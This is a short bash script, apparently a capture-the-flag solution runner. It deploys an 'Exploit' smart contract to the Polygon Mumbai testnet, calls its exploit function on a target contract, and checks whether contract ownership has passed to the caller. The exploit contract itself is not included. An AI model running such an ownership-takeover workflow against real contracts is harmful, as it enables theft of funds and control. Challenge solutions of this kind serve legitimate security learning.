#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

PUBLIC_KEY="$(cast wallet address $PRIVATE_KEY)"

echo "[INFO] Deploying exploit contract..." >&2
EXPLOIT_ADDRESS=$(forge create \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    src/Exploit.sol:Exploit\
    | grep "Deployed to:" \
    | awk '{print $3}')

if [ $? -ne 0 ] || [ -z "$EXPLOIT_ADDRESS" ]
then
    echo "[ERROR] Exploit contract deployment failed" >&2
    exit 1
fi
echo "[INFO] Contract deployed to $EXPLOIT_ADDRESS" >&2

echo "[INFO] Calling exploit function..." >&2
cast send "$EXPLOIT_ADDRESS" \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    --gas-limit 50000 \
    "exploit(address, address)" \
    "$CONTRACT_ADDRESS" \
    "$PUBLIC_KEY"

if [ $? -ne 0 ]
then
    echo "[ERROR] Call to exploit function failed" >&2
    exit 1;
fi

echo "[INFO] Checking if exploit succeeded..." >&2
OWNER=$(cast call $CONTRACT_ADDRESS \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "owner()(address)")

if [ "$OWNER" == "$PUBLIC_KEY" ]
then
    echo "solved!"
else
    echo "[ERROR] exploit failed '$OWNER' != '$PUBLIC_KEY'" >&2
fi
